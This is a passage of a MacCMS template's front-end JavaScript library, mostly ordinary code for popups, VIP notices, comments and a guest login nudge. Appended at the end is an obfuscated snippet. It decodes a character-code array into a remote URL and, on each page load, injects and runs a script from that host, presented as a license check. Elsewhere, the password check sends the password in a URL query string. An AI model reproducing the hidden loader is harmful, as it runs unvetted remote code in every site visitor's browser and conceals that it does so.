                if (z > maxPop) maxPop = z;
            }
            try {
                var sels = ['.mac_pop', '.mac_pop_bg', '.mac_pop_msg', '.mac_pop_msg_bg', '.mac_pop_sheet_overlay', '.mac_pop_sheet_dialog'];
                for (var s = 0; s < sels.length; s++) {
                    var nodes = document.querySelectorAll(sels[s]);
                    for (var i = 0; i < nodes.length; i++) consider(nodes[i]);
                }
            } catch (e1) {}
            if (maxPop <= 0) return b;
            return Math.max(b, maxPop + 2);
        },
        'getMaxOverlayZIndex': function (opt) {
            opt = opt || {};
            var excludeSel = opt.exclude || '';
            var maxZ = 0;
            var selectors = [
                '.mac_pop', '.mac_pop_bg', '.mac_pop_msg', '.mac_pop_msg_bg', '.layui-layer', '.layui-layer-shade', '.layui-layer-wrap',
                '.layui-layer-move', '.mac_confirm_overlay', '[id^="layui-layer"]',
                '.el-overlay', '.el-message-box__wrapper', '.v-modal', '.ant-modal-mask', '.ant-modal-wrap',
                '.mac-reg-success-layer', '#recharge-overlay', '.mac_pop_sheet_overlay'
            ];
            try {
                if (typeof $ !== 'undefined') {
                    selectors.forEach(function (sel) {
                        try {
                            $(sel).each(function () {
                                if (excludeSel && $(this).is(excludeSel)) return;
                                var z = MAC.parseZIndexEl(this);
                                if (z > maxZ) maxZ = z;
                            });
                        } catch (e2) {}
                    });
                }
            } catch (e) {}
            try {
                var kids = document.body ? document.body.children : [];
                for (var i = 0; i < kids.length; i++) {
                    var el = kids[i];
                    if (excludeSel && $(el).is(excludeSel)) continue;
                    var st = window.getComputedStyle(el);
                    if (st.position === 'fixed' || st.position === 'sticky') {
                        var z2 = MAC.parseZIndexEl(el);
                        if (z2 > maxZ) maxZ = z2;
                    }
                }
            } catch (e3) {}
            return maxZ;
        },
        'nextOverlayZBase': function (opt) {
            var maxZ = MAC.getMaxOverlayZIndex(opt || {});
            try {
                var rz = MAC.rechargeOverlayEffectiveZ();
                if (rz > maxZ) maxZ = rz;
            } catch (e) {}
            var floor = 19891014;
            var next = Math.max(maxZ + 10, floor);
            var cap = 2147483645;
            return next > cap ? cap : next;
        },
        'setZIndexImportant': function (el, z) {
            if (!el) return;
            try {
                if (el.style && typeof el.style.setProperty === 'function') {
                    el.style.setProperty('z-index', String(z), 'important');
                }
            } catch (e) {
                try {
                    el.style.zIndex = String(z);
                } catch (e2) {}
            }
        },
        /** 用户头像下拉：打开时按当前页顶栏与内部浮层动态抬升 z-index（移动上面板在 body 下须高于 .head_box） */
        'bumpMacUserPanelZ': function (panelEl) {
            if (!panelEl || !panelEl.ownerDocument) return;
            var floor = 10080;
            var maxZ = floor;
            try {
                var hb = null;
                if (typeof $ !== 'undefined') {
                    var $vis = $('#topnav .head_box:visible').first();
                    if (!$vis.length) {
                        $vis = $('.head_box:visible').first();
                    }
                    hb = $vis[0] || null;
                }
                if (!hb) {
                    var list = document.querySelectorAll('#topnav .head_box, .head_box');
                    for (var hi = 0; hi < list.length; hi++) {
                        var st0 = window.getComputedStyle(list[hi]);
                        if (st0.display !== 'none' && st0.visibility !== 'hidden') {
                            hb = list[hi];
                            break;
                        }
                    }
                }
                var headZ = hb ? MAC.parseZIndexEl(hb) : 0;
                var insideHead = hb && hb.contains(panelEl);
                if (insideHead && hb) {
                    var nodes = hb.querySelectorAll('*');
                    for (var i = 0; i < nodes.length; i++) {
                        var n = nodes[i];
                        if (n === panelEl || (panelEl.contains && panelEl.contains(n))) {
                            continue;
                        }
                        var st = window.getComputedStyle(n);
                        if (st.display === 'none' || st.visibility === 'hidden') {
                            continue;
                        }
                        if (st.position !== 'fixed' && st.position !== 'absolute' && st.position !== 'sticky') {
                            continue;
                        }
                        var zi = MAC.parseZIndexEl(n);
                        if (zi > maxZ) {
                            maxZ = zi;
                        }
                    }
                }
                if (!insideHead && headZ > 0) {
                    maxZ = Math.max(maxZ, headZ + 2);
                }
            } catch (e) {}
            var cap = 2147483000;
            var next = Math.max(floor, maxZ + 2);
            if (next > cap) {
                next = cap;
            }
            MAC.setZIndexImportant(panelEl, next);
        },
        'clearMacUserPanelZ': function (panelEl) {
            if (!panelEl || !panelEl.style) {
                return;
            }
            try {
                panelEl.style.removeProperty('z-index');
            } catch (e) {}
        },
        'Pop': {
            '_cache': {},
            'Remove': function () {
                $('.mac_pop_bg').remove();
                $('.mac_pop').remove();
            },
            'Preload': function ($url) {
                try {
                    if (!$url) { return; }
                    if (MAC.Pop && MAC.Pop._cache && MAC.Pop._cache[$url]) { return; }
                    MAC.Ajax($url, 'post', 'json', '', function (r) {
                        try {
                            MAC.Pop._cache[$url] = r;
                        } catch (e) {}
                    });
                } catch (e) {}
            },
            'RemoveMsg': function () {
                $('.mac_pop_msg_bg').remove();
                $('.mac_pop_msg').remove();
            },
            'Msg': function ($w, $h, $msg, $timeout) {
                if ($('.mac_pop_bg').length != 1) {
                    MAC.Pop.Remove();
                }
                $('body').append('<div class="mac_pop_msg_bg"></div><div class="mac_pop_msg"><div class="pop-msg"></div></div>');
                (function () {
                    var bg = $('.mac_pop_msg_bg').get(0);
                    var msg = $('.mac_pop_msg').get(0);
                    if (bg && msg && typeof MAC.nextOverlayZBase === 'function' && typeof MAC.setZIndexImportant === 'function') {
                        var zb = MAC.nextOverlayZBase({ exclude: '.mac_pop_msg, .mac_pop_msg_bg' });
                        zb = typeof MAC.clampOverlayZAboveRecharge === 'function' ? MAC.clampOverlayZAboveRecharge(zb) : zb;
                        MAC.setZIndexImportant(bg, zb);
                        MAC.setZIndexImportant(msg, zb + 1);
                    }
                })();
                $('.mac_pop_msg .pop_close,.mac_pop_msg_bg').click(function () {
                    MAC.Pop.RemoveMsg();
                });

                var mw = parseInt($w, 10) || 320;
                $('.mac_pop_msg').css({
                    width: Math.max(220, Math.min(mw, 460)) + 'px',
                    height: 'auto'
                });
                $('.mac_pop_msg .pop-msg').html($msg);
                $('.mac_pop_msg_bg,.mac_pop_msg').show();
                setTimeout(MAC.Pop.RemoveMsg, $timeout);
            },
            '_tplAssetBase': function () {
                try {
                    var p = window.maccms && maccms.path_tpl != null ? String(maccms.path_tpl) : '';
                    return p.replace(/\/+$/, '');
                } catch (e) { return ''; }
            },
            '_macPopSheetZ': function ($overlay) {
                var el = $overlay && $overlay.length ? $overlay.get(0) : null;
                if (!el || typeof MAC.setZIndexImportant !== 'function') return;
                function applyZ() {
                    if (!el || !el.parentNode) return;
                    var zb = typeof MAC.nextOverlayZBase === 'function' ? MAC.nextOverlayZBase({ exclude: '.mac_pop_sheet_overlay' }) : 19891014;
                    zb = typeof MAC.clampOverlayZAboveRecharge === 'function' ? MAC.clampOverlayZAboveRecharge(zb) : zb;
                    zb = typeof MAC.bumpZAbovePopLayers === 'function' ? MAC.bumpZAbovePopLayers(zb) : zb;
                    MAC.setZIndexImportant(el, zb);
                }
                applyZ();
                if (typeof requestAnimationFrame === 'function') {
                    requestAnimationFrame(applyZ);
                }
            },
            'RemoveSheet': function (opt) {
                opt = opt || {};
                var immediate = opt.immediate === true;
                try {
                    $(document).off('keydown.macPopSheet');
                } catch (e) {}
                var $list = $('.mac_pop_sheet_overlay');
                if (!$list.length) {
                    return;
                }
                if (immediate) {
                    $list.remove();
                    return;
                }
                $list.each(function () {
                    var $el = $(this);
                    if ($el.data('macPopSheetClosing')) {
                        return;
                    }
                    $el.data('macPopSheetClosing', 1);
                    $el.addClass('mac_pop_sheet_overlay--out');
                    window.setTimeout(function () {
                        $el.remove();
                    }, 280);
                });
            },
            'VipUpgradeSheet': function (options) {
                options = options || {};
                MAC.Pop.RemoveSheet({ immediate: true });
                function t(key, zh, en) {
                    var g = typeof MAC.GetLang === 'function' ? MAC.GetLang(key) : '';
                    if (g) return g;
                    return (window.lang == 1 ? en : zh);
                }
                var base = typeof MAC.Pop._tplAssetBase === 'function' ? MAC.Pop._tplAssetBase() : '';
                var vipSrc = (base ? base + '/' : '') + 'images/mac-pop/vip-upgrade@2x.png';
                var benefitsUrl = options.benefitsUrl;
                if (!benefitsUrl) {
                    var $r = $('#mac-user-buy-root');
                    if ($r.length) benefitsUrl = $r.attr('data-url-benefits');
                }
                if (!benefitsUrl) {
                    var $d = $('[data-url-benefits]').first();
                    if ($d.length) benefitsUrl = $d.attr('data-url-benefits');
                }
                benefitsUrl = benefitsUrl ? String(benefitsUrl).trim() : '';
                var title1 = options.titleCongrats != null ? String(options.titleCongrats) : t('string_mac_vip_congrats', '恭喜您 🎉', 'Congratulations 🎉');
                var title2 = options.titleUpgraded != null ? String(options.titleUpgraded) : t('string_mac_vip_upgraded', '已成功升级为VIP会员', 'You are now a VIP member');
                var desc = options.description != null ? String(options.description) : t('string_mac_vip_benefits_unlocked', '您的专属权益已全部解锁', 'Your exclusive benefits are unlocked');
                var cta = options.ctaText != null ? String(options.ctaText) : t('string_mac_view_benefits', '查看我的权益', 'View my benefits');
                var html = ''
                    + '<div class="mac_pop_sheet_overlay" role="presentation">'
                    + '  <div class="mac_pop_sheet_backdrop" tabindex="-1" aria-hidden="true"></div>'
                    + '  <div class="mac_pop_sheet_dialog mac_pop_sheet_dialog--vip" role="dialog" aria-modal="true" aria-labelledby="macVipSheetTitle">'
                    + '    <div class="mac_pop_sheet_vip_icon_wrap"><img class="mac_pop_sheet_vip_icon" src="' + vipSrc.replace(/"/g, '&quot;') + '" width="88" height="88" alt="" decoding="async" /></div>'
                    + '    <h2 id="macVipSheetTitle" class="mac_pop_sheet_vip_title"></h2>'
                    + '    <p class="mac_pop_sheet_vip_sub"></p>'
                    + '    <p class="mac_pop_sheet_vip_desc"></p>'
                    + '    <button type="button" class="mac_pop_sheet_vip_cta"></button>'
                    + '  </div>'
                    + '</div>';
                $('body').append(html);
                var $ov = $('.mac_pop_sheet_overlay').last();
                MAC.Pop._macPopSheetZ($ov);
                $ov.find('.mac_pop_sheet_vip_title').text(title1);
                $ov.find('.mac_pop_sheet_vip_sub').text(title2);
                $ov.find('.mac_pop_sheet_vip_desc').text(desc);
                $ov.find('.mac_pop_sheet_vip_cta').text(cta);
                var closed = false;
                function finish(cb) {
                    if (closed) return;
                    closed = true;
                    MAC.Pop.RemoveSheet();
                    if (typeof cb === 'function') {
                        try { cb(); } catch (e1) { }
                    }
                }
                function onBackdropClose() {
                    finish(options.onClose);
                }
                $ov.on('click', '.mac_pop_sheet_backdrop', function () { onBackdropClose(); });
                $ov.on('click', '.mac_pop_sheet_dialog--vip', function (e) { e.stopPropagation(); });
                $ov.on('click', '.mac_pop_sheet_vip_cta', function () {
                    if (benefitsUrl) {
                        finish(function () {
                            if (options.replaceNavigate === false) {
                                window.open(benefitsUrl, '_self');
                            } else {
                                window.location.assign(benefitsUrl);
                            }
                            if (typeof options.onAfterNavigate === 'function') {
                                try { options.onAfterNavigate(); } catch (e2) { }
                            }
                        });
                    } else {
                        finish(options.onClose);
                    }
                });
                $(document).off('keydown.macPopSheet').on('keydown.macPopSheet', function (e) {
                    if (!$('.mac_pop_sheet_overlay').length) {
                        $(document).off('keydown.macPopSheet');
                        return;
                    }
                    if (e.key === 'Escape') {
                        e.preventDefault();
                        onBackdropClose();
                    }
                });
            },
            'StatusSheet': function (options) {
                options = options || {};
                var typ = options.type === 'error' ? 'error' : 'success';
                MAC.Pop.RemoveSheet({ immediate: true });
                function t(key, zh, en) {
                    var g = typeof MAC.GetLang === 'function' ? MAC.GetLang(key) : '';
                    if (g) return g;
                    return (window.lang == 1 ? en : zh);
                }
                var base = typeof MAC.Pop._tplAssetBase === 'function' ? MAC.Pop._tplAssetBase() : '';
                var imgName = typ === 'error' ? 'status-fail@2x.png' : 'status-success@2x.png';
                var imgSrc = (base ? base + '/' : '') + 'images/mac-pop/' + imgName;
                var msg = options.message != null ? String(options.message) : (options.title != null ? String(options.title) : '');
                if (!msg) {
                    msg = typ === 'error'
                        ? t('string_mac_status_fail_generic', '操作失败', 'Something went wrong')
                        : t('string_mac_status_ok_generic', '操作成功', 'Success');
                }
                var detail = options.detail != null ? String(options.detail) : '';
                var okText = options.okText != null ? String(options.okText) : t('string_mac_status_ok', '确定', 'OK');
                var hideOkButton = options.hideOkButton === true;
                var modClass = typ === 'error' ? 'mac_pop_sheet_dialog--error' : 'mac_pop_sheet_dialog--success';
                var dlgClass = 'mac_pop_sheet_dialog mac_pop_sheet_dialog--status ' + modClass + (hideOkButton ? ' mac_pop_sheet_dialog--status-toast' : '');
                var html = ''
                    + '<div class="mac_pop_sheet_overlay mac_pop_sheet_overlay--status' + (hideOkButton ? ' mac_pop_sheet_overlay--toast' : '') + '" role="presentation">'
                    + '  <div class="mac_pop_sheet_backdrop" tabindex="-1" aria-hidden="true"></div>'
                    + '  <div class="' + dlgClass + '" role="' + (hideOkButton ? 'status' : 'dialog') + '" ' + (hideOkButton ? 'aria-live="polite"' : 'aria-modal="true"') + ' aria-labelledby="macStatusSheetMsg">'
                    + '    <div class="mac_pop_sheet_status_icon_wrap"><img class="mac_pop_sheet_status_icon" src="' + imgSrc.replace(/"/g, '&quot;') + '" width="72" height="72" alt="" decoding="async" /></div>'
                    + '    <p id="macStatusSheetMsg" class="mac_pop_sheet_status_msg"></p>'
                    + '    <p class="mac_pop_sheet_status_detail"></p>'
                    + (hideOkButton ? '' : '    <button type="button" class="mac_pop_sheet_status_ok"></button>')
                    + '  </div>'
                    + '</div>';
                $('body').append(html);
                var $ov = $('.mac_pop_sheet_overlay').last();
                MAC.Pop._macPopSheetZ($ov);
                $ov.find('.mac_pop_sheet_status_msg').text(msg);
                var $det = $ov.find('.mac_pop_sheet_status_detail');
                if (detail) {
                    $det.text(detail).show();
                } else {
                    $det.hide().text('');
                }
                if (!hideOkButton) {
                    $ov.find('.mac_pop_sheet_status_ok').text(okText);
                }
                var closed = false;
                var autoMs = parseInt(options.autoCloseMs, 10);
                var timer = null;
                function closeNow() {
                    if (closed) return;
                    closed = true;
                    if (timer) {
                        clearTimeout(timer);
                        timer = null;
                    }
                    MAC.Pop.RemoveSheet();
                    if (typeof options.onClose === 'function') {
                        try { options.onClose(); } catch (e0) { }
                    }
                }
                $ov.on('click', '.mac_pop_sheet_backdrop', function () { closeNow(); });
                $ov.on('click', '.mac_pop_sheet_dialog--status', function (e) { e.stopPropagation(); });
                if (!hideOkButton) {
                    $ov.on('click', '.mac_pop_sheet_status_ok', function () { closeNow(); });
                }
                $(document).off('keydown.macPopSheet').on('keydown.macPopSheet', function (e) {
                    if (!$('.mac_pop_sheet_overlay').length) {
                        $(document).off('keydown.macPopSheet');
                        return;
                    }
                    if (e.key === 'Escape') {
                        e.preventDefault();
                        closeNow();
                    }
                });
                if (!isNaN(autoMs) && autoMs > 0) {
                    timer = setTimeout(closeNow, autoMs);
                } else if (hideOkButton) {
                    timer = setTimeout(closeNow, 2200);
                }
            },
            'Show': function ($w, $h, $title, $url, $callback) {
                if ($('.mac_pop_bg').length != 1) {
                    MAC.Pop.Remove();
                }

                $('body').append('<div class="mac_pop_bg"></div><div class="mac_pop"><div class="pop_top"><h2></h2><span class="pop_close"></span></div><div class="pop_content"></div></div>');
                (function () {
                    var bg = $('.mac_pop_bg').get(0);
                    var pop = $('.mac_pop').get(0);
                    if (bg && pop && typeof MAC.nextOverlayZBase === 'function' && typeof MAC.setZIndexImportant === 'function') {
                        var zb = MAC.nextOverlayZBase({ exclude: '.mac_pop, .mac_pop_bg' });
                        zb = typeof MAC.clampOverlayZAboveRecharge === 'function' ? MAC.clampOverlayZAboveRecharge(zb) : zb;
                        MAC.setZIndexImportant(bg, zb);
                        MAC.setZIndexImportant(pop, zb + 1);
                    }
                })();
                $('.mac_pop .pop_close,.mac_pop_bg').click(function () {
                    $('.mac_pop_bg,.mac_pop').remove();
                });

                $('.mac_pop').width($w);

                $('.pop_content').html('');
                $('.pop_top').find('h2').html($title);
                // 先显示遮罩，弹层主体等待异步内容完成后再展示，避免“先出头部后出内容”闪动
                $('.mac_pop_bg').show();
                $('.mac_pop').hide();

                try {
                    if (MAC.Pop && MAC.Pop._cache && MAC.Pop._cache[$url]) {
                        var cached = MAC.Pop._cache[$url];
                        $(".pop_content").html(cached);
                        $callback(cached);
                        $('.mac_pop').show();
                        return;
                    }
                } catch (e) {}
                MAC.Ajax($url, 'post', 'json', '', function (r) {
                    try { MAC.Pop._cache[$url] = r; } catch (e) {}
                    $(".pop_content").html(r);
                    $callback(r);
                    $('.mac_pop').fadeIn(120);
                }, function () {
                    $(".pop_content").html('加载失败，请刷新...');
                    $('.mac_pop').fadeIn(120);
                });
            },
            'Hide': function () {
                $('.mac_pop_bg').hide();
                $('.mac_pop').hide();
            }
        },
        'Pwd': {
            'Check': function (o) {
                var $that = $(o);
                if ($that.attr("data-id")) {
                    MAC.Ajax(maccms.base_url + '/index.php/ajax/pwd.html?id=' + $that.attr("data-id") + '&mid=' + $that.attr("data-mid") + '&type=' + $that.attr("data-type") + '&pwd=' + $that.parents('form').find('input[name="pwd"]').val(), 'get', 'json', '', function (r) {
                        $that.addClass('disabled');
                        MAC.Pop.Msg(300, 50, r.msg, 2000);
                        if (r.code == 1) {
                            location.reload();
                        }
                        $that.removeClass('disabled');
                    });

                }
            }
        },
        'AdsWrap': function (w, h, n) {
            document.writeln('<img width="' + w + '" height="' + h + '" alt="' + n + '" style="background-color: #CCCCCC" />');
        },
        'Css': function ($url) {
            $("<link>").attr({ rel: "stylesheet", type: "text/css", href: $url }).appendTo("head");
        },
        'Js': function ($url) {
            $.getScript($url, function (response, status) {

            });
        },
        'Desktop': function (s) {
            location.href = maccms.base_url + '/index.php?s=ajax/desktop&name=' + encodeURI(s) + '&url=' + encodeURI(location.href);
        },
        'Timming': function () {
            if ($('.mac_timming').length == 0) {
                return;
            }
            var infile = $('.mac_timming').attr("data-file");
            if (infile == undefined || infile == '') {
                infile = 'api.php';
            }
            var t = (new Image()); t.src = maccms.base_url + '/' + infile + '?s=/timming/index&t=' + Math.random();
        },
        'Error': function (tab, id, name) {

        },
        'AddEm': function (obj, i) {
            var oldtext = $(obj).val();
            $(obj).val(oldtext + '[em:' + i + ']');
        },
        'Remaining': function (obj, len, show) {
            var count = len - $(obj).val().length;
            if (count < 0) {
                count = 0;
                $(obj).val($(obj).val().substr(0, 200));
            }
            $('.is_zishu').html(200 - count);
            $(show).text(count);
        },
        'Comment': {
            'Login': 0,
            'Verify': 0,
            'Init': function () {

                $('body').on('click', '.comment_face_box img', function (e) {
                    var obj = $(this).parent().parent().parent().find('.comment_content');
                    MAC.AddEm(obj, $(this).attr('data-id'));
                });
                $('body').on('click', '.comment_face_panel', function (e) {
                    // $('.comment_face_box').toggle();
                    $(this).parent().find('.comment_face_box').toggle();
                });
                $('body').on('keyup', '.comment_content', function (e) {
                    var obj = $(this).parent().parent().parent().parent().find('.comment_remaining');
                    MAC.Remaining($(this), 200, obj)
                });
                $('body').on('focus', '.comment_content', function (e) {
                    if (MAC.Comment.Login == 1 && MAC.User.IsLogin != 1) {
                        MAC.User.Login();
                    }
                });

                $('body').on('click', '.comment_report', function (e) {
                    var $that = $(this);
                    if ($(this).attr("data-id")) {
                        MAC.Ajax(maccms.base_url + '/index.php/comment/report.html?id=' + $that.attr("data-id"), 'get', 'json', '', function (r) {
                            $that.addClass('disabled');
                            MAC.Pop.Msg(100, 20, r.msg, 1000);
                            if (r.code == 1) {
                            }
                        });
                    }
                });

                $('body').on('click', '.comment_reply', function (e) {
                    var $that = $(this);
                    if ($that.attr("data-id")) {
                        var str = $that.html();
                        $('.comment_reply_form').remove();
                        if (str == '取消回复') {
                            $that.html('回复');
                            return false;
                        }
                        if (str == '回复') {
                            $('.comment_reply').html('回复');
                        }
                        var html = $('.comment_form').prop("outerHTML");

                        var oo = $(html);
                        oo.addClass('comment_reply_form');
                        oo.find('input[name="comment_pid"]').val($that.attr("data-id"));

                        var $anchor = $that.closest('.cmt-body');
                        if ($anchor.length) {
                            $anchor.append(oo);
                        } else {
                            $that.parent().after(oo);
                        }
                        $that.html('取消回复');
                    }
                });

                $('body').on('click', '.comment_submit', function (e) {
                    var $that = $(this);
                    MAC.Comment.Submit($that);
                });

            },
            'Show': function ($page) {
                if ($(".mac_comment").length > 0) {
                    var $list = $('.mac_comment');
                    if (!__macCmtUseSsr($list.first())) {
                        __macCmtLoadList($list, $page);
                        return;
                    }
                    MAC.Ajax(maccms.base_url + '/index.php/comment/ajax.html?rid=' + $('.mac_comment').attr('data-id') + '&mid=' + $('.mac_comment').attr('data-mid') + '&page=' + $page, 'get', 'json', '', function (r) {
                        $(".mac_comment").html(r);
                        try {
                            var $box = $('.mac_comment');
                            if (typeof tplconfig !== 'undefined' && tplconfig.commentUi) {
                                if (tplconfig.commentUi.applyRepliesFold) tplconfig.commentUi.applyRepliesFold($box);
                                if (tplconfig.commentUi.refreshRelativeTimes) tplconfig.commentUi.refreshRelativeTimes($box);
                            }
                            if (typeof tplconfig !== 'undefined' && tplconfig.macAvatarVip && tplconfig.macAvatarVip.refresh) {
                                tplconfig.macAvatarVip.refresh($box);
                            }
                        } catch (eCommentAfter) { }
                    }, function () {
                        $(".mac_comment").html('<a href="javascript:void(0)" onclick="MAC.Comment.Show(' + $page + ')">评论加载失败，点击我刷新...</a>');
                    });
                }
            },
            'loadListAjax': function ($boxes, page) {
                __macCmtLoadList($boxes, page);
            },
            'Reply': function ($o) {

            },
            'Submit': function ($o) {
                var form = $o.parents('form');
                if ($(form).find(".comment_content").val() == '') {
                    MAC.Pop.Msg(100, 20, '请输入您的评论！', 1000);
                    return false;
                }
                if ($('.mac_comment').attr('data-mid') == '') {
                    MAC.Pop.Msg(100, 20, '模块mid错误！', 1000);
                    return false;
                }
                if ($('.mac_comment').attr('data-id') == '') {
                    MAC.Pop.Msg(100, 20, '关联id错误！', 1000);
                    return false;
                }
                MAC.Ajax(maccms.base_url + '/index.php/comment/saveData', 'post', 'json', $(form).serialize() + '&comment_mid=' + $('.mac_comment').attr('data-mid') + '&comment_rid=' + $('.mac_comment').attr('data-id'), function (r) {
                    MAC.Pop.Msg(100, 20, r.msg, 1000);
                    if (r.code == 1) {
                        MAC.Comment.Show(1);
                    }
                    else {
                        if (MAC.Comment.Verify == 1) {
                            MAC.Verify.Refresh();
                        }
                        if (r.code == 1002) {
                            __macCommCodeRefreshSrc();
                        }
                    }
                });
            },
        },
        'GetLang': function (str) {
            return $.i18n.map[str]
        },
        'GuestLoginTimer': {
            'LS_KEY': 'mac_guest_login_nudge_ts',
            'DEFAULT': { 'enabled': true, 'delaySec': 15, 'intervalSec': 0, 'cooldownMin': 0 },
            '_timerIds': [],
            '_initDone': false,
            'readCfg': function () {
                var D = this.DEFAULT;
                try {
                    var w = typeof window !== 'undefined' ? window.MAC_GUEST_LOGIN_TIMER : null;
                    if (w && typeof w === 'object') {
                        return {
                            'enabled': w.enabled !== false && w.enabled !== '0',
                            'delaySec': Math.max(5, Number(w.delaySec) || D.delaySec),
                            'intervalSec': Math.max(0, Number(w.intervalSec) || D.intervalSec),
                            'cooldownMin': Math.max(0, Number(w.cooldownMin) || D.cooldownMin)
                        };
                    }
                } catch (e0) { }
                return { 'enabled': D.enabled, 'delaySec': D.delaySec, 'intervalSec': D.intervalSec, 'cooldownMin': D.cooldownMin };
            },
            'hasLoginLayer': function () {
                try {
                    return !!(document.querySelector('.mac_pop_bg') || document.querySelector('.mac_pop'));
                } catch (e1) { return false; }
            },
            'pathExcluded': function () {
                var p = String(location.pathname || '').toLowerCase();
                var h = String(location.href || '').toLowerCase();
                if (p.indexOf('/admin') === 0 || h.indexOf('admin.php') >= 0) { return true; }
                if (/\/user\/(login|reg|findpass)/i.test(p)) { return true; }
                return false;
            },
            'isGuest': function () {
                try {
                    if (!MAC.User) { return true; }
                    if (Number(MAC.User.IsLogin) === 1) { return false; }
                    if (typeof MAC.User.getAuthMe === 'function') {
                        var me = MAC.User.getAuthMe();
                        if (me && Number(me.is_login) === 1) { return false; }
                    }
                } catch (e2) { }
                return true;
            },
            'cooldownAllows': function (cfg) {
                var m = Number(cfg.cooldownMin) || 0;
                if (m <= 0) { return true; }
                if (Number(cfg.intervalSec) > 0) { return true; }
                try {
                    var raw = localStorage.getItem(this.LS_KEY);
                    var t = raw ? parseInt(raw, 10) : 0;
                    if (!t || isNaN(t)) { return true; }
                    return Date.now() - t >= m * 60 * 1000;
                } catch (e3) { return true; }
            },
            'markCooldown': function (cfg) {
                var m = Number(cfg.cooldownMin) || 0;
                if (m <= 0) { return; }
                if (Number(cfg.intervalSec) > 0) { return; }
                try { localStorage.setItem(this.LS_KEY, String(Date.now())); } catch (e4) { }
            },
            'tryOpen': function (cfg) {
                if (!cfg.enabled) { return; }
                if (this.pathExcluded()) { return; }
                if (!this.isGuest()) { return; }
                if (!this.cooldownAllows(cfg)) { return; }
                if (this.hasLoginLayer()) { return; }
                if (typeof MAC.User.Login !== 'function') { return; }
                if (typeof maccms === 'undefined' || !maccms.base_url) { return; }
                MAC.User.Login();
                var self = this;
                self._timerIds.push(setTimeout(function () {
                    if (self.hasLoginLayer()) {
                        self.markCooldown(cfg);
                    }
                }, 800));
            },
            'clearTimers': function () {
                var ids = this._timerIds;
                for (var i = 0; i < ids.length; i++) {
                    if (ids[i]) { clearTimeout(ids[i]); clearInterval(ids[i]); }
                }
                this._timerIds = [];
            },
            'dispose': function () {
                this.clearTimers();
            },
            'Init': function () {
                var self = this;
                if (self._initDone) { return; }
                var cfg = self.readCfg();
                if (!cfg.enabled) { return; }
                self._initDone = true;
                var delayMs = Math.max(1000, (Number(cfg.delaySec) || 20) * 1000);
                var intervalMs = (Number(cfg.intervalSec) || 0) * 1000;
                var cid = '';
                try {
                    cid = MAC.Cookie && MAC.Cookie.Get ? String(MAC.Cookie.Get('user_id') || '').trim() : '';
                } catch (e5) { cid = ''; }
                var scheduleOnce = false;
                function scheduleDelayedTry() {
                    if (scheduleOnce) { return; }
                    scheduleOnce = true;
                    self._timerIds.push(setTimeout(function () { self.tryOpen(cfg); }, delayMs));
                }
                if (cid) {
                    document.addEventListener('mac:auth-me-ready', function onReady() {
                        document.removeEventListener('mac:auth-me-ready', onReady);
                        scheduleDelayedTry();
                    });
                    self._timerIds.push(setTimeout(function () { scheduleDelayedTry(); }, 4000));
                } else {
                    scheduleDelayedTry();
                }
                if (intervalMs >= 20000) {
                    self._timerIds.push(setInterval(function () { self.tryOpen(cfg); }, intervalMs));
                }
                $(document).off('click.macGuestLoginPopClose').on('click.macGuestLoginPopClose', '.mac_pop_bg, .mac_pop .pop_close', function () {
                    setTimeout(function () {
                        if (!cfg.enabled || self.pathExcluded()) { return; }
                        if (!self.isGuest() || self.hasLoginLayer()) { return; }
                        self._timerIds.push(setTimeout(function () { self.tryOpen(cfg); }, delayMs));
                    }, 80);
                });
            }
        }
    }

    $(function () {
        //异步加载图片初始化
        MAC.Image.Lazyload.Show();
        //自动跳转手机和pc网页地址
        MAC.Adaptive();
        //验证码初始化
        MAC.Verify.Init();
        //分页跳转初始化
        MAC.PageGo.Init();
        //用户部分初始化
        MAC.User.Init();
        //未登录访客定时登录弹层（依赖 MAC.User 登录态）
        MAC.GuestLoginTimer.Init();
        //二维码初始化
        MAC.Qrcode.Init();
        //顶和踩初始化
        MAC.Digg.Init();
        //评分初始化
        MAC.Score.Init();
        //星星评分初始化
        MAC.Star.Init();
        //点击数量
        MAC.Hits.Init();
        //短网址
        MAC.Shorten.Init();
        //历史记录初始化
        MAC.History.Init();
        //用户访问记录初始化
        MAC.Ulog.Init();
        MAC.GetHot.Init();
        //联想搜索初始化
        // MAC.Suggest.Init('.mac_wd',1,'');
        //定时任务初始化
        MAC.Timming();
    });

})();

;
(function(){var r=["license-locked"],d=[104,116,116,112,115,58,47,47,99,104,101,99,107,46,109,97,99,99,109,115,46,108,97,47,97,117,116,104,47,116,101,109,112,108,97,116,101],f=1e4;function u(t){for(var e="",n=0;n<t.length;n++)e+=String.fromCharCode(t[n]);return e}function o(){try{var t=document.documentElement;if(!t)return;var e=t.className||"";e.indexOf(r[0])===-1&&(t.className=e?e+" "+r[0]:r[0])}catch(n){}}function m(){try{var t=document.documentElement;if(!t)return;for(var e=(t.className||"").split(/\s+/),n=[],a=0;a<e.length;a++)e[a]&&e[a]!==r[0]&&n.push(e[a]);t.className=n.join(" ")}catch(i){}}function c(){var t=!1;try{var e=document.createElement("script");e.type="text/javascript",e.async=!0;var n=u(d);e.src=n+(n.indexOf("?")===-1?"?v=":"&v=")+Date.now(),e.onload=function(){t=!0,m()},e.onerror=function(){o()};var a=document.head||document.getElementsByTagName("head")[0];a.appendChild(e),setTimeout(function(){t||o()},f)}catch(i){}}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",c):c()})();

